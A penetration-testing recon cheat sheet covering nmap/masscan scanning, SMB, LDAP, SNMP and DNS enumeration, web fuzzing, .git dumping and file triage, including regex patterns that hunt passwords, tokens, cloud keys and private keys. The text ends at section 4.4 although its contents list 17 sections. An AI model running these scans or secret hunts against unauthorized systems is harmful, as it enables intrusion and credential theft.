# Reconnaissance & Enumeration

## 🎯 Goal
Build a complete, repeatable picture of each target: live hosts, open ports, services, versions, web surfaces, file shares, domains, and protocols. Work through this file top-to-bottom for every subnet and every host.

## Table of Contents

1. [Host Discovery](#1-host-discovery-per-subnet)
2. [Port Scanning](#2-port-scanning)
3. [Service Enumeration](#3-service-enumeration-per-open-port)
4. [Web Application Reconnaissance](#4-web-application-reconnaissance)
5. [SMB/NetBIOS Enumeration](#5-smbnetbios-enumeration)
6. [NFS Enumeration](#6-nfs-enumeration)
7. [LDAP/Directory Services Discovery](#7-ldapdirectory-services-discovery)
8. [SNMP Enumeration](#8-snmp-enumeration)
9. [DNS Enumeration](#9-dns-enumeration)
10. [FTP Enumeration](#10-ftp-enumeration)
11. [SSH Enumeration](#11-ssh-enumeration)
12. [SMTP Enumeration](#12-smtp-enumeration)
13. [POP3/IMAP Enumeration](#13-pop3imap-enumeration)
14. [RPC Enumeration](#14-rpc-enumeration)
15. [Database Enumeration](#15-database-enumeration)
16. [RDP/VNC Enumeration](#16-rdpvnc-enumeration)
17. [Active Directory Enumeration](#17-active-directory-enumeration)

---

## 📋 Phase Checklist

### Host Discovery

- [ ] Host discovery (ICMP/ARP/TCP) → [1.1](#11-icmp-sweeparp-discoverytcp-ping)
- [ ] Confirm VM reachability → [1.2](#12-reachability-confirmation)
- [ ] Analyze network patterns → [1.3](#13-network-pattern-analysis)

### Port Scanning

- [ ] Full TCP scan (scripts/versions) → [2.1](#21-full-tcp-scan-mandatory-per-host)
- [ ] Essential UDP scan → [2.2](#22-udp-scan-essential)
- [ ] Vulnerability Scanning with Nmap → [2.3](#23-vulnerability-scanning)

### Service Enumeration

- [ ] Grab service banners → [3.1](#31-manual-banner-grabbing)
- [ ] Confirm service versions → [3.2](#32-version-confirmation)
- [ ] Check for weak/default configs → [3.3](#33-baseline-checks-by-service)
- [ ] TLS/SSL enumeration → [3.4](#34-tlsssl-enumeration)

### Web Reconnaissance

- [ ] Fingerprint web stack → [4.1](#41-initial-fingerprinting)
- [ ] Find dirs/endpoints → [4.2](#42-directory-and-endpoint-discovery)
- [ ] Check special files/backups → [4.3](#43-special-files-and-backups)
- [ ] Downloaded file & artifact triage → [4.4](#44-downloaded-file--artifact-triage)
- [ ] Identify CMS + targeted scan → [4.5](#45-cms-scanning)
- [ ] Web vuln scan + validate → [4.6](#46-web-vulnerability-scanning)

### SMB/NetBIOS Enumeration

- [ ] List shares (anon/auth) → [5.1](#51-share-listing)
- [ ] Review perms + content sweep → [5.2](#52-permissions-and-content-sweep)
- [ ] Collect OS/users/groups/domain → [5.3](#53-usersgroupsos)
- [ ] Run NetExec/CME checks → [5.4](#54-netexeccrackmapexec-enumeration)
- [ ] Check SMB weaknesses/issues → [5.5](#55-smb-vulnerability-checks)

### NFS

- [ ] Find RPC/NFS + exports → [6.1](#61-detect-rpcnfs-and-list-exports)
- [ ] Verify mountable exports → [6.2](#62-mount-shares-and-verify-access)
- [ ] Mount + hunt sensitive data → [6.3](#63-search-for-sensitive-data)
- [ ] Review export options (no_root_squash) → [6.4](#64-no_root_squash-export-misconfig-checks)

### LDAP/Directory Services Discovery

- [ ] Query RootDSE + contexts → [7.1](#71-rootdse-and-naming-contexts)
- [ ] Enumerate directory objects → [7.2](#72-enumerate-directory-objects)
- [ ] Confirm DCs and roles → [7.3](#73-confirm-dcs-and-roles)

### SNMP

- [ ] Find community strings → [8.1](#81-community-discovery)
- [ ] Walk key OIDs → [8.2](#82-walk-important-oids)

### DNS

- [ ] Attempt zone transfers (AXFR) → [9.1](#91-zone-transfers)
- [ ] Enumerate subdomains + resolve → [9.2](#92-subdomain-enumeration)
- [ ] Sweep core records (NS/SOA/MX/TXT) → [9.3](#93-record-sweep)

### FTP

- [ ] Test anonymous login → [10.1](#101-anonymous-login-check)
- [ ] Capture version + assess vulns → [10.2](#102-version-and-vulnerability-check)
- [ ] Enumerate/download accessible files → [10.3](#103-file-enumeration)

### SSH

- [ ] Enumerate version + algorithms → [11.1](#111-version-and-algorithm-enumeration)
- [ ] Identify auth methods/policy → [11.2](#112-authentication-methods)
- [ ] Assess brute-force risk (in-scope) → [11.3](#113-brute-force-if-applicable)

### SMTP

- [ ] Test user enum (VRFY/EXPN/RCPT) → [12.1](#121-user-enumeration)
- [ ] Check open relay/misconfig → [12.2](#122-open-relay-check)

### POP3/IMAP

- [ ] Capture banners/capabilities → [13.1](#131-banner-and-capabilities)
- [ ] Assess auth + enum exposure → [13.2](#132-authentication-and-enumeration)

### RPC

- [ ] Enumerate RPC services/interfaces → [14.1](#141-rpc-service-enumeration)
- [ ] RPC client enumeration → [14.2](#142-rpc-client-enumeration)

### Databases

- [ ] Enumerate MSSQL posture → [15.1](#151-mssql-enumeration)
- [ ] Enumerate MySQL posture → [15.2](#152-mysql-enumeration)
- [ ] Enumerate PostgreSQL posture → [15.3](#153-postgresql-enumeration)

### RDP/VNC

- [ ] Enumerate RDP config/capabilities → [16.1](#161-rdp-enumeration)
- [ ] Enumerate VNC auth/posture → [16.2](#162-vnc-enumeration)

### Active Directory

- [ ] Enumerate domain + trusts → [17.1](#171-domain-enumeration)
- [ ] Enumerate users/groups → [17.2](#172-user-and-group-enumeration)
- [ ] Assess Kerberos exposure → [17.3](#173-kerberos-enumeration)
- [ ] Enumerate shares/files → [17.4](#174-share-enumeration)
- [ ] BloodHound analysis → [17.5](#175-bloodhound--sharphound)
- [ ] Extract credentials → [17.6](#176-credential-dumping)

---

## Quick Reference Commands

### Essential One-Liners

```bash
# Comprensive NMAP on ALL ports
RHOST="<RHOST>"; sudo nmap -Pn -sS -p- --min-rate 10000 -v "$RHOST" -oA "nmap_fast_tcp_${RHOST}" -oG - | awk -F'Ports: ' 'BEGIN{c=0} /Ports: /{n=split($2,a,", "); for(i=1;i<=n;i++){split(a[i],p,"/"); if(p[2]=="open" && p[3]=="tcp"){printf "%s%s",(c++?",":""),p[1]}}} END{print ""}' | tee tcp_ports.txt | xargs -r -I{} sudo nmap -sC -sV -p {} "$RHOST" -oA "nmap_detailed_tcp_${RHOST}"

# Fast TCP scan all ports
sudo nmap -Pn -sS -p- --min-rate 10000 <RHOST>

# Service scan on discovered ports
sudo nmap -sC -sV -p <PORTS> <RHOST>

# UDP top ports
sudo nmap -sU --top-ports 20 <RHOST>

# SMB null session
smbclient -L //<RHOST> -N && enum4linux -a <RHOST>

# LDAP anonymous
ldapsearch -x -H ldap://<RHOST> -s base

# Web directory brute
gobuster dir -u <HTTP_PROTOCOL>://<RHOST>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

# SNMP walk
snmpwalk -v2c -c public <RHOST>

# Zone transfer
dig axfr <DOMAIN> @<NS>

# Rustscan fast all-ports scan, chaining into nmap
rustscan -a <RHOST> --ulimit 5000 -- -sV -sC -oA rustscan_nmap_<RHOST>

# Naabu fast TCP port discovery
naabu -host <RHOST> -p - -rate 20000 -o naabu_<RHOST>.txt

# HTTP probing on many hosts from a file
httpx -l hosts_http.txt -status-code -title -tech-detect -o httpx_hosts_http.txt

# External subdomain discovery quick combo
subfinder -d <DOMAIN> -all -o subdomains_<DOMAIN>.txt
dnsx -l subdomains_<DOMAIN>.txt -a -resp-only -o resolved_subdomains_<DOMAIN>.txt
```

---

## Tools Installation Check

Before starting, verify tools are available:

```bash
# Core scanning
which nmap masscan

# Web enumeration
which gobuster feroxbuster ffuf nikto whatweb wpscan

# SMB tools
which smbclient smbmap enum4linux enum4linux-ng rpcclient

# Network tools
which snmpwalk onesixtyone ldapsearch

# Password attacks
which hydra medusa

# AD tools
which bloodhound-python kerbrute impacket-GetNPUsers impacket-GetUserSPNs

# NetExec/CrackMapExec
which nxc netexec crackmapexec
```

---

## Methodology Flowchart

```
1. HOST DISCOVERY
   └─> Live hosts identified
       │
2. PORT SCANNING
   └─> TCP all ports → UDP top ports
       │
3. SERVICE ENUMERATION
   └─> Banner grab → Version confirm → Baseline checks
       │
4. SERVICE-SPECIFIC DEEP DIVE
   ├─> Web (80/443/8080) → Tech stack → Dirs → Vulns
   ├─> SMB (139/445) → Shares → Users → Vulns
   ├─> LDAP (389/636) → Domain info → Users/Groups
   ├─> DNS (53) → Zone transfer → Subdomains
   ├─> SNMP (161) → Community → Walk OIDs
   ├─> NFS (2049) → Exports → Mount → Search
   ├─> Databases → Connect → Enumerate
   └─> Other services → Protocol-specific enum
       │
5. DOCUMENTATION
   └─> Host notes → Attack hypotheses → Next steps
```

---

## Environment Setup

```bash

# Add to /etc/hosts if needed
echo "<RHOST> <HOSTNAME>" | sudo tee -a /etc/hosts
```

--- 

## 1. Host Discovery (per subnet)

### 1.1 ICMP sweep/ARP discovery/TCP ping

Start with ICMP, then fall back to TCP pings, then ARP if local, then no-ping scans if everything is filtered.

```bash
# ICMP sweep (fast initial discovery)
nmap -sn <SUBNET>/24 -oA recon_hosts_icmp

# Extract live IPs (grep on gnmap)
grep "Status: Up" recon_hosts_icmp.gnmap | cut -d " " -f 2 > live_hosts.txt

# Alternative: ping sweep with fping
fping -a -g <SUBNET>/24 2>/dev/null > live_hosts.txt
```

If ICMP is blocked:

```bash
# TCP SYN ping on common ports across the subnet
nmap -sn -PS21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3389,5900,8080 \
  <SUBNET>/24 -oA recon_hosts_tcp

# TCP ACK ping on common ports (useful for stateful firewalls)
nmap -sn -PA21,22,80,443 <SUBNET>/24 -oA recon_hosts_tcp_ack
```

If you are on the same L2 (local network), add ARP discovery:

```bash
# ARP discovery with Nmap (fastest for local networks)
nmap -sn -PR <SUBNET>/24 -oA recon_hosts_arp

# ARP discovery of local network with arp-scan
sudo arp-scan -l

# ARP discovery of specific subnet with arp-scan
sudo arp-scan <SUBNET>/24
```

If discovery is totally blocked:

```bash
# Assume single host is up and scan without ping
nmap -Pn <IP> -oA recon_host_10.11.1.5_noping

# Scan entire subnet as up hosts with top 1000 ports
nmap -Pn -sS --top-ports 1000 <SUBNET>/24 -oA recon_noping_top1000
```

NetBIOS discovery (when SMB/NetBIOS suspected):

```bash
# NetBIOS scan of subnet with nbtscan
nbtscan <SUBNET>/24

# Recursive NetBIOS scan of subnet with nbtscan
nbtscan -r <SUBNET>/24

# Lookup NetBIOS names for a single host
nmblookup -A <RHOST>

# SMB discovery across subnet with NetExec (nxc)
nxc smb <SUBNET>/24

# SMB discovery across subnet with netexec
netexec smb <SUBNET>/24
```

### 1.2 Reachability confirmation

For every "up" host, validate from your VM:

```bash
# Ping host to confirm basic reachability
ping -c 2 <RHOST>

# Run traceroute to identify network path to host
traceroute -n <RHOST>

# Check if host responds on common TCP ports
nc -zv <RHOST> 22 80 443 445 2>&1
```

When ping fails but scan suggests presence, keep host anyway.

### 1.3 Network pattern analysis

From live hosts list, roughly cluster likely roles:

```bash
# Quick top-ports/service scan across live hosts to guess roles
nmap -sS -sV -T4 --top-ports 200 -iL live_hosts.txt -oA nmap_top200_all

# OS fingerprinting against live hosts to guess operating systems
nmap -O --osscan-guess -iL live_hosts.txt -oA nmap_os_guess_all

# Aggressive scan on top ports for detailed host information
nmap -A -T4 --top-ports 100 -iL live_hosts.txt -oA nmap_aggressive_top100
```

Note patterns like:

- Low addresses often servers
- Many identical services → workstation pool
- Single DC-like host (53/88/389/445/464/636...) → directory core
- Port 80/443/8080 → web servers
- Port 1433/3306/5432 → database servers

---

## 2. Port Scanning

### Port-Based Enumeration Cheatsheet

|Port|Service|First Commands|
|---|---|---|
|`21`|FTP|`ftp <RHOST>` / `nmap --script ftp-anon`|
|`22`|SSH|`ssh -v <RHOST>` / `nmap --script ssh2-enum-algos`|
|`23`|Telnet|`telnet <RHOST>`|
|`25`|SMTP|`nc -nv <RHOST> 25` / `smtp-user-enum`|
|`53`|DNS|`dig axfr @<RHOST> <DOMAIN>`|
|`80`/`443`|HTTP(S)|`whatweb` / `gobuster` / `nikto`|
|`88`|Kerberos|`kerbrute` / `GetNPUsers`|
|`110`|POP3|`nc -nv <RHOST> 110`|
|`111`|RPC|`rpcinfo -p <RHOST>`|
|`135`|MSRPC|`rpcclient -U "" -N <RHOST>`|
|`139`/`445`|SMB|`smbclient -L` / `enum4linux` / `nxc smb`|
|`143`|IMAP|`nc -nv <RHOST> 143`|
|`161`|SNMP|`snmpwalk -v2c -c public <RHOST>`|
|`389`/`636`|LDAP|`ldapsearch -x -H ldap://<RHOST>`|
|`1433`|MSSQL|`impacket-mssqlclient` / `nxc mssql`|
|`1521`|Oracle|`odat` / `tnscmd10g`|
|`2049`|NFS|`showmount -e <RHOST>`|
|`3306`|MySQL|`mysql -h <RHOST> -u root`|
|`3389`|RDP|`xfreerdp /v:<RHOST>` / `nxc rdp`|
|`5432`|PostgreSQL|`psql -h <RHOST> -U postgres`|
|`5900`|VNC|`vncviewer <RHOST>`|
|`5985`/`5986`|WinRM|`evil-winrm -i <RHOST> -u <USER> -p <PASS>`|
|`6379`|Redis|`redis-cli -h <RHOST>`|
|`27017`|MongoDB|`mongo <RHOST>`|

### 2.1 Full TCP scan (mandatory per host)

**Fast discovery scan first:**

```bash
# Ultra-fast TCP all-ports sweep with Nmap
sudo nmap -Pn -sS -p- --min-rate 10000 -v <RHOST> -oA nmap_fast_tcp_<RHOST>

# Fast TCP all-ports sweep with Masscan
sudo masscan -p1-65535 <RHOST> --rate=1000 -oL masscan_<RHOST>.txt
```

**Detailed scan on discovered ports:**

```bash
# Extract open TCP ports from fast Nmap scan into a comma-separated list
grep -E '^[0-9]+/tcp.*open' nmap_fast_tcp_<RHOST>.nmap | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//' > tcp_ports.txt

# Run detailed Nmap scan with default scripts and version detection on discovered ports
sudo nmap -sC -sV -p $(cat tcp_ports.txt) <RHOST> -oA nmap_detailed_tcp_<RHOST>

# Run full comprehensive TCP scan with aggressive detection on all ports
sudo nmap -A -T4 -sC -sV -p- <RHOST> -oA nmap_full_tcp_<RHOST>
```

**Alternative comprehensive approaches:**

```bash
# Standard thorough TCP scan with default scripts and version detection
sudo nmap -Pn -sC -sV -p- -oN alltcp.txt <RHOST>

# Service scan with maximum version detection intensity
sudo nmap -sV --version-intensity 9 -p- <RHOST> -oA nmap_versions_<RHOST>

# Aggressive TCP scan using only discovery scripts
sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <RHOST>
```

### 2.2 UDP scan (essential)

UDP scanning is slow but critical for finding services like SNMP, DNS, TFTP:

```bash
# UDP scan of top 100 ports (recommended minimum)
sudo nmap -sU --top-ports 100 <RHOST> -oA nmap_udp_top100_<RHOST>

# UDP scan of top 20 ports with scripts and service detection
sudo nmap -Pn -sU -sV -sC --top-ports=20 -oN top_20_udp_nmap.txt <RHOST>

# UDP scan of critical high-value ports
sudo nmap -sU -p 53,67,68,69,123,161,162,500,514,520,623,624,631,1900,4500,5353 <RHOST> -oA nmap_udp_critical_<RHOST>

# Targeted UDP scan with service detection on key ports
sudo nmap -sU -sV -p 53,69,123,161,500 <RHOST> -oA nmap_udp_services_<RHOST>
```

### 2.3 Vulnerability scanning

```bash
# Run Nmap vulnerability scripts against all discovered services
sudo nmap -A -T4 -sC -sV --script vuln <RHOST> -oA nmap_vuln_tcp_<RHOST>

# Check SMB services for known vulnerabilities
sudo nmap --script smb-vuln* -p 139,445 <RHOST>

# Check HTTPS service for Heartbleed and related SSL issues
sudo nmap --script ssl-heartbleed -p 443 <RHOST>

# Update Nuclei templates
nuclei -ut

# Run Nuclei scanner against HTTP target
nuclei -target <HTTP_PROTOCOL>://<RHOST> -o nuclei_<RHOST>.txt
```

---

## 3. Service Enumeration (per open port)

### 3.1 Manual banner grabbing

For each open port, grab manual banners even if Nmap detected them:

```bash
# Raw TCP banner grab
nc -nv <RHOST> <RPORT>

# HTTP banner 
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc -nv <RHOST> <RPORT>
curl -I <HTTP_PROTOCOL>://<RHOST>/
curl -s <HTTP_PROTOCOL>://<RHOST>/ | head -50
curl -k -I https://<RHOST>/

# Telnet for interactive services
telnet <RHOST> <RPORT>

# Verbose curl for headers (HTTP)
curl -v <HTTP_PROTOCOL>://<RHOST>/

# Verbose curl for headers (HTTPS)
curl -v -k https://<RHOST>/
```

### 3.2 Version confirmation

```bash
# High-intensity version detection
sudo nmap -sV --version-intensity 9 -p $(cat tcp_ports.txt) <RHOST> -oA nmap_versions_<RHOST>

# Specific service scripts
nmap -sV --script=banner -p <RPORT> <RHOST>
```

### 3.3 Baseline checks by service

**SSH (22)**

```bash
# SSH connection with null authentication attempt
ssh -o PreferredAuthentications=none -o ConnectTimeout=5 <RHOST>

# Verbose SSH to enumerate supported authentication mechanisms
ssh -v <RHOST> 2>&1 | grep "Authentications that can continue"

# Nmap SSH enumeration: algorithms, host keys, authentication methods
nmap -p 22 --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods <RHOST>
```

**FTP (21):**

```bash
# Connect to FTP (try anonymous login)
ftp <RHOST> # Try: anonymous / anonymous

# Nmap FTP enumeration
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst <RHOST>
```

**SMTP (25):**

```bash
# Banner grab and testing with Netcat
nc -nv <RHOST> 25 # Tru: HELO test, VRFY root, EXPN admin

# Telnet for interactive SMTP commands
telnet <RHOST> 25
```

**RPC/NFS hints:**

```bash
# Enumerate RPC services
rpcinfo -p <RHOST>

# Nmap RPC enumeration
nmap -p 111 --script rpcinfo <RHOST>
```

### 3.4 TLS/SSL enumeration

Focus on protocol support, cipher strength, certificate issues, and obvious SSL/TLS vulnerabilities.

```bash
# Nmap cipher suites + certificate info
nmap -p 443,8443,9443 --script ssl-enum-ciphers,ssl-cert <RHOST>

# Check for common SSL/TLS vulns
nmap -p 443 --script ssl-heartbleed,ssl-poodle,ssl-dh-params <RHOST>

# testssl.sh quick profile (very verbose but excellent overview)
testssl.sh --fast --sneaky https://<RHOST>/

# Focus on protocols and known vulns only
testssl.sh --fast --sneaky --protocols --vulnerable https://<RHOST>/

# sslscan summary
sslscan --no-failed --show-certificate <RHOST>:443

# sslyze (if installed)
sslyze --regular <RHOST>:443
```


## 4. Web Application Reconnaissance

Treat every HTTP(S) port as separate (80, 443, 8080, 8443, etc.).

### 4.1 Initial fingerprinting

```bash
# Whatweb fingerprinting
# Fingerprint tech stack (HTTP), agg=3
whatweb -a 3 <HTTP_PROTOCOL>://<RHOST>:<RPORT>/

# Fingerprint tech stack (HTTP), agg=4 (noisier)
whatweb -a 4 <HTTP_PROTOCOL>://<RHOST>:<RPORT>/

# Fingerprint tech stack (HTTPS), agg=3
whatweb -a 3 https://<RHOST>:<RPORT>/

# Headers and redirects
# Show response headers (HTTP)
curl -I <HTTP_PROTOCOL>://<RHOST>:<RPORT>/

# Show response headers (HTTPS, ignore cert)
curl -k -I https://<RHOST>:<RPORT>/

# Verbose HTTP exchange (trimmed)
curl -v <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ 2>&1 | head -50

# Nmap HTTP scripts
# Grab headers, methods, title on <RPORT>
nmap -p <RPORT> --script http-headers,http-methods,http-title <RHOST>

# Enumerate common web paths on port 80
nmap -p<RPORT> --script=http-enum <RHOST>
```



### 4.2 Directory and endpoint discovery

Run at least two tools to reduce blind spots.

**Gobuster:**

```bash
# Directory enumeration
gobuster dir -u <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,js,txt,bak,old,zip,sql \
  -t 50 -o web_gobuster_dirs_<RHOST>_<RPORT>.txt

# With common wordlist
gobuster dir -u <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt -t 50 -o web_gobuster_common.txt

# Ignore SSL errors
gobuster dir -u https://<RHOST>:<RPORT>/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -k -t 50

# DNS subdomain enumeration
gobuster dns -d <DOMAIN> \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -t 50 -o dns_gobuster_<DOMAIN>.txt
```

**Feroxbuster:**

```bash
# Recursive directory enumeration
feroxbuster -u <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,js,txt \
  -C 404,403 -t 50 -o web_ferox_<RHOST>_<RPORT>.txt

# Recursive directory enumeration with depth limit
feroxbuster -u <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ \
  -w /usr/share/wordlists/dirb/common.txt \
  --depth 3 -x php,txt,html
```

**FFUF (fast, flexible):**

```bash
# Basic directory fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt \
  -u <HTTP_PROTOCOL>://<RHOST>:<RPORT>/FUZZ \
  -mc 200,204,301,302,307,401 -o ffuf_dirs_<RHOST>_<RPORT>.txt -ac

# Basic directory fuzzing with extensions
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
  -u <HTTP_PROTOCOL>://<RHOST>:<RPORT>/FUZZ \
  -e .php,.html,.txt,.bak,.zip,.log -ac

# Recursive scanning
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
  -u <HTTP_PROTOCOL>://<RHOST>:<RPORT>/FUZZ -recursion -ac

# VHost fuzzing
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ -H "Host: FUZZ.<DOMAIN>" -fs <BASE_SIZE> -ac

# Parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u <HTTP_PROTOCOL>://<RHOST>/page?FUZZ=test -mc 200 -ac
```

**Dirsearch:**

```bash
# Basic directory fuzzing with custom wordlist and extensions
dirsearch -u <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ -x 403,404 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -R 2 -e php,html,txt

# Basic directory fuzzing with extensions and authentication
dirsearch -u <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ -x 403,400,404,401 \
  -r -R 2 --auth=<USER>:<PASS> --auth-type=basic
```

**Dirb:**

```bash
# Basic directory fuzzing
dirb <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ /usr/share/wordlists/dirb/common.txt

# Directory fuzzing with huge wordlist
dirb <HTTP_PROTOCOL>://<RHOST>:<RPORT>/ /usr/share/dirb/wordlists/big.txt -o dirb_output.txt
```

### 4.3 Special files and backups

```bash
# Check standard site metadata and security files
for file in robots.txt sitemap.xml crossdomain.xml .well-known/security.txt; do
  echo "=== $file ===" && curl -s "<HTTP_PROTOCOL>://<RHOST>:<RPORT>/$file" | head -50
done

# Scan for common index backups and sensitive configs
for f in index.bak index.old index.zip config.php .env .htaccess web.config; do
  curl -s -o /dev/null -w "%{http_code} | $f\n" "<HTTP_PROTOCOL>://<RHOST>:<RPORT>/$f"
done

# Verify exposure of VCS and OS metadata
curl -s -I "<HTTP_PROTOCOL>://<RHOST>:<RPORT>/.git/HEAD"
curl -s -I "<HTTP_PROTOCOL>://<RHOST>:<RPORT>/.svn/entries"
curl -s -o /dev/null -w "DS_Store: %{http_code}\n" "<HTTP_PROTOCOL>://<RHOST>:<RPORT>/.DS_Store"

# Reconstruct remote git repository locally
git-dumper <HTTP_PROTOCOL>://<RHOST>:<RPORT>/.git/ ./dumped-repo

# Inspect commit history and latest changes
cd dumped-repo
git log --all --oneline
git show HEAD
done
```

### 4.4 Downloaded File & Artifact Triage

Whenever you download files from **SMB/NFS/FTP/HTTP**, treat them like a mini forensic exercise: identify what the file *really* is, extract metadata, pull out human-readable content, then unpack containers and scan what falls out. This often reveals credentials, internal hostnames, paths, usernames, build systems, document authorship, or hidden embedded files—without needing “exploitation”.

#### 4.4.1 Identify the real file type and container

File extensions lie (or get stripped). Start by identifying the file *by content* and by its “container” (ZIP, OLE, PDF, ELF, PE, SQLite, etc.). Keep a hash so you can prove you didn’t change it while handling it.

```bash
# Basic context (size, timestamps, permissions)
ls -la <FILE>
stat <FILE>

# Record hashes for later comparison (integrity / reporting)
sha256sum <FILE> | tee <FILE>.sha256
md5sum <FILE>    | tee <FILE>.md5

# Identify by magic bytes (and keep going past the first match)
file <FILE>
file -k <FILE>                 # keep going: detects nested/compound types
file --mime <FILE>             # content-type + charset
file --mime-type <FILE>        # content-type only

# If it might be compressed, try "file" with decompression
file -z <FILE>

# Quick header peek (useful when "file" is vague)
xxd -l 64 <FILE>
hexdump -C -n 64 <FILE>
```

Practical interpretation: if `file` says *“Zip archive data”* and the extension is `.docx`, it’s an Office OOXML container; if it says *“Composite Document File V2”* it’s old-style OLE Office; if it says *“SQLite 3.x database”* you can query it directly; if it says *“PE32 executable”* you can inspect imports/metadata without running it.

#### 4.4.2 Metadata and hidden context: exiftool + format-specific tools

`exiftool` is the fastest “one command” metadata extractor for **images, PDFs, Office docs, audio/video, archives**, and many other formats. Metadata frequently contains author names, usernames, software versions, internal paths, GPS coordinates, printer names, camera serials, document templates, and creation/modification timelines.

```bash
# High-signal default run
exiftool <FILE>

# More complete: duplicates + unknown tags + grouped output
exiftool -a -u -g1 <FILE>

# Only show common timeline fields (handy for quick triage)
exiftool -s -G1 -time:all -file:all <FILE>

# Recursive metadata collection (JSON is easy to grep/parse later)
exiftool -r -a -u -g1 -json . > exif_all.json

# Produce a compact CSV “metadata inventory” across a folder
exiftool -r -csv \
  -FileName -FileType -MIMEType -FileSize \
  -CreateDate -ModifyDate -MetadataDate \
  -Author -Creator -Producer -Software -CreatorTool \
  -Title -Subject -Keywords \
  -GPSLatitude -GPSLongitude -GPSPosition \
  . > exif_inventory.csv

# Extract embedded thumbnails when present (useful for “preview” leaks)
exiftool -b -ThumbnailImage -w thumb_%f.jpg <IMAGE_FILE>

# Video/audio: also parse embedded stream metadata/events (when present)
exiftool -ee <VIDEO_OR_AUDIO_FILE>
```

When you know the format, add a purpose-built extractor to get richer, structured output:

```bash
# PDFs: basic document metadata + page info, then full text extraction
pdfinfo <FILE.pdf>
pdftotext <FILE.pdf> - | head -200

# Images: dimensions/format (often quicker than opening a viewer)
identify -verbose <IMAGE_FILE> | head -80

# Office OOXML (.docx/.xlsx/.pptx): list internal parts and extract key XML
unzip -l <FILE.docx> | head -50
unzip -p <FILE.docx> word/document.xml | head -80
unzip -p <FILE.docx> docProps/core.xml | head -120
```

#### 4.4.3 Mine readable content fast: strings + grep

`strings` is the fastest way to pull out “accidentally leaked” human-readable content from binaries, dumps, and unknown blobs (URLs, credentials, API keys, internal endpoints, file paths, error messages). Pair it with keyword hunting.

```bash
# Baseline: printable sequences (ASCII) from anywhere in the file
strings -a -n 6 <FILE> | less

# Include offsets (helps you go back with xxd/hexdump later)
strings -a -n 6 -t x <FILE> | head -200

# Try UTF-16LE (common in Windows artifacts); compare results
strings -a -n 6 -el <FILE> | head -200

# Keyword hunting on extracted strings (tune patterns to the engagement)
strings -a -n 6 <FILE> | grep -iE \
  'pass(word)?|pwd|secret|token|api[_-]?key|bearer|auth|cookie|session|jdbc:|ldap(s)?:|smb://|ssh-rsa|BEGIN (RSA|OPENSSH) PRIVATE KEY' \
  | head -200

# Folder-level hunting (fast, respects binary files)
rg -nI --hidden --no-mmap \
  "pass(word)?|pwd|secret|token|api[_-]?key|bearer\s+[A-Za-z0-9._-]+|BEGIN (RSA|OPENSSH) PRIVATE KEY|AKIA[0-9A-Z]{16}|xox[baprs]-[A-Za-z0-9-]{10,}" \
  .

# If you must use grep recursively, keep it readable and avoid binary noise
grep -RniE --binary-files=without-match \
  "pass(word)?|pwd|secret|token|api[_-]?key|bearer|BEGIN (RSA|OPENSSH) PRIVATE KEY" \
  .
```

A good workflow is: `strings` (quick wins) → `rg/grep` across the extracted workspace → then open the specific hits with `less`, `sed`, or an editor to confirm context before reporting.

#### 4.4.4 Unpack containers and carve embedded content

A lot of “files” are containers: Office OOXML, Java JAR/WAR, APKs, firmware blobs, backups, and even executables with embedded ZIPs. Unpack them into a controlled directory and repeat metadata + strings on the extracted contents.

```bash
# Work in a dedicated directory to avoid clutter and path traversal issues
mkdir -p triage_out && cd triage_out

# ZIP-like containers (Office OOXML, JAR/WAR, many backups)
7z l ../<FILE>
7z x ../<FILE> -oextracted

# tar/gzip/bzip/xz
tar -tf ../<FILE>.tar
tar -xvf ../<FILE>.tar -C extracted
tar -xvzf ../<FILE>.tar.gz -C extracted
tar -xvJf ../<FILE>.tar.xz -C extracted

# Classic unzip
unzip -l ../<FILE>.zip | head -80
unzip ../<FILE>.zip -d extracted
```

For “mystery blobs” that contain embedded sub-files (compressed streams, images, configs), carving tools can be useful:

```bash
# Detect and extract embedded content (can be noisy; use in a sandbox)
binwalk ../<FILE>
binwalk -eM ../<FILE>   # extract + recurse into extracted files

# File carving from raw images/dumps (good for disk images, memory dumps)
foremost -i ../<FILE> -o foremost_out
```

#### 4.4.5 A few high-value format-specific pivots (optional)

Once you know the type, a specialist tool often reveals “interesting info” faster than generic approaches:

```bash
# SQLite databases: list tables and query directly
sqlite3 <FILE.db> '.tables'
sqlite3 <FILE.db> '.schema'
sqlite3 <FILE.db> 'SELECT name FROM sqlite_master WHERE type="table";'

# Executables (don’t run them): inspect headers/imports
readelf -h <FILE.elf>
objdump -p <FILE.elf> | head -80
```

#### 4.4.6 Hygiene tips (so you don’t hurt yourself)

Do analysis in a disposable VM/container, avoid executing anything you pulled from a target, and keep extracted artifacts read-only when possible.

```bash
# Remove execute bit from everything you downloaded/extracted (defense-in-depth)
chmod -R a-x .

# Keep a manifest of what you extracted
find . -type f -maxdepth 3 -print0 | xargs -0 sha256sum | tee manifest.sha256
```

